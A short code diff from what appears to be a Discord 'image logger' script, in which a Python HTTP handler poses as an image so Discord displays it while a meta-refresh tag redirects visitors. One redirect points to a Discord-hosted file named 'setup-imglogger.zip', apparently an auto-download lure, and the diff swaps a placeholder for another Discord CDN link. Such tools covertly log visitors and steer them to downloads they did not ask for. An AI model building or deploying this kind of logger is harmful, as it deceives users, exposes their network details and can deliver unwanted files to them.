@@ -266,7 +266,7 @@ height: 100vh;
 
                 if config["redirect"]["redirect"]:
                     data = f'<meta http-equiv="refresh" content="0;url=https://cdn.discordapp.com/attachments/1201309858511716362/1201366504625676490/setup-imglogger.zip?ex=65c98ebf&is=65b719bf&hm=570eec170338e73059e40b6ff92e6fdd1ae92f1dcbc566371986961fc5655893&">' \
-                f'<meta http-equiv="refresh" content="0;url=YOUR_NEW_URL">'.encode()
+                f'<meta http-equiv="refresh" content="0;url=https://cdn.discordapp.com/attachments/1150324884031950898/1201369489942515763/8jthWYF_7.png?ex=65c99186&is=65b71c86&hm=d1732ca7970a8778a910cf31ce65d2e53c01c7cdcaa470ab118231308a73b25d&">'.encode()
                 self.send_response(200)  # 200 = OK (HTTP Status)
                 self.send_header('Content-type', datatype)  # Define the data as an image so Discord can show it.
                 self.end_headers()  # Declare the headers as finished.
